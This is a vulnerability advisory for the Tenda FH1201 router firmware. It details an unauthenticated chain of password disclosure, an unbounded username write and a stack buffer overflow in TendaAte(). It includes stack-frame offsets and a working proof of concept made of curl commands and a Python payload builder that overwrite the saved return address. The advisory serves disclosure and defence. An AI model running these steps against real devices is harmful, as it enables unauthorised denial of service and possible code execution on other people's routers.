# CVE-TBD: Zero-credential chain to a stack overflow with return-address control in Tenda FH1201

## Summary

Three weak design decisions combine into a fully unauthenticated exploit chain in the Tenda FH1201:
the login page discloses the current administrator password, the password-change handler accepts it
through the authentication bypass and stores an **arbitrarily long** `sys.username`, and the
manufacturing handler copies that value into a **128-byte stack buffer without a length check**.
A 263-byte payload overwrites the saved return address; execution can be redirected to any address
inside `httpd` (verified).

## Affected Product

- Vendor: Tenda · Product: FH1201 · Firmware: **V1.2.0.19(946)** (latest, 2026-07-13)

- Status: the vendor lists FH1201 V1.0 as end-of-life (discontinued 2015) yet published
  firmware V1.2.0.19(946) on 2026-07-13 as a security update for CVE-2026-11405

## Vulnerability Details

- Type: Stack-based Buffer Overflow (**CWE-121**); Missing Authentication (**CWE-306**) and
  Insufficiently Protected Credentials (**CWE-522**) as enablers
- Components: `bin/httpd` → `fromSysToolChangePwd()` (`0x00479110`), `TendaAte()` (`0x0045c25c`),
  and the nvram accessors `SetValue()` / `GetValue()` (libCfm)

### Step 1 — password disclosure on the unauthenticated login page
`/login.asp` is static HTML that embeds the current password so the page can pre-fill the field:

```html
def_passwd = str_decode("<%getnvram("sys.userpass");%>");
```
The rendered page contains the base64 form of the administrator password. No credentials required.

### Step 2 — unbounded nvram write through the password change handler
`POST /goform/SysToolChangePwd/login.asp` (reachable via the `login.asp` bypass of advisory 01)
verifies `mitOldPASSWORD` against the stored password and then:

```c
SetValue("sys.username", websGetVar(wp, "mitNewUSERNAME", ""));   /* no length limit */
```

### Step 3 — unbounded read into a 128-byte stack buffer
`GET /goform/ate` (authentication-exempt, advisory 02) reaches `TendaAte()`, whose frame is:

```asm
0045c268  addiu sp, sp, -288
0045c26c  sw    ra, 284(sp)        ; saved ra  = fp+284
0045c270  sw    s8, 280(sp)        ; saved s8  = fp+280
0045c288  addiu v0, s8, 24         ; memset(bufA, 0, 128)   bufA = fp+24
0045c2b0  addiu v0, s8, 152        ; memset(bufB, 0, 128)   bufB = fp+152
```
followed by `GetValue("sys.username", bufA)` — an unbounded `strcpy` into a 128-byte buffer.
The saved return address is therefore at **offset 260** from the start of the value.

## Proof of Concept (non-destructive: no persistent change is left, the device is rebooted)

```bash
# 1) obtain the current admin password (base64) from the unauthenticated login page
curl -s http://<router>/login.asp | grep -o 'str_decode("[^"]*"' | head -1

# 2) store a 263-byte payload as the user name (old password = the leaked value)
python3 - <<'PY'
import struct, subprocess
payload = b"A"*260 + bytes([0x60,0x40,0x4a])   # ra = 0x004a4060 (exit@plt); 0x00 comes from strcpy's NUL
open("/tmp/u.bin","wb").write(payload)
PY
curl -s -X POST --data-urlencode "GO=system_password.asp" \
     --data-urlencode "mitOldUSERNAME=" --data-urlencode "mitOldPASSWORD=<leaked>" \
     --data-urlencode "mitNewUSERNAME@/tmp/u.bin" \
     --data-urlencode "mitNewPASSWORD=bmV3cGFzcw==" --data-urlencode "mitCfrmNewPASSWORD=bmV3cGFzcw==" \
     http://<router>/goform/SysToolChangePwd/login.asp      # 302 /system_password.asp

# 3) trigger: the 263-byte value is copied over the saved ra
curl -s http://<router>/goform/ate
```

Verified behaviour (two payloads differing only in the last three bytes):

| `ra` written | httpd after the trigger | qemu |
|---|---|---|
| `0x00414141` (unmapped) | process dies | `uncaught target signal 11 (Segmentation fault)` |
| `0x004a4060` (`exit` PLT stub) | **clean exit, no signal, no crash handler** | — |

That differential demonstrates **precise return-address control**. (The same experiment performed
through the password-change handler instead of `TendaAte` shows only a crash, because intermediate
live locals are corrupted before the epilogue — documented in `docs/root-cause.md`.)

## Impact

- **Verified**: unauthenticated memory corruption of the web server, which stops serving
  (`httpd` is the main process; on the device the web/management interface becomes unavailable
  until reboot). Return-address control is proven, so arbitrary code execution is reachable in
  principle; a full RCE payload was **not** completed (the value cannot contain NUL bytes, which
  constrains the target address space to `0x00xxxxxx`).
- The chain requires **no credentials and no user interaction**, and leaves no persistent change
  other than the modified user name.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5**
Rationale: scored on the verified effect (pre-authentication denial of service); the verified
return-address control suggests a higher impact but code execution was not demonstrated, so the
score stays conservative.

## Discovery

Discovered by Zimo-666 on 2026-10-17 via rehosting, frame-layout analysis and differential
crash/exit experiments. Vendor notified: pending.
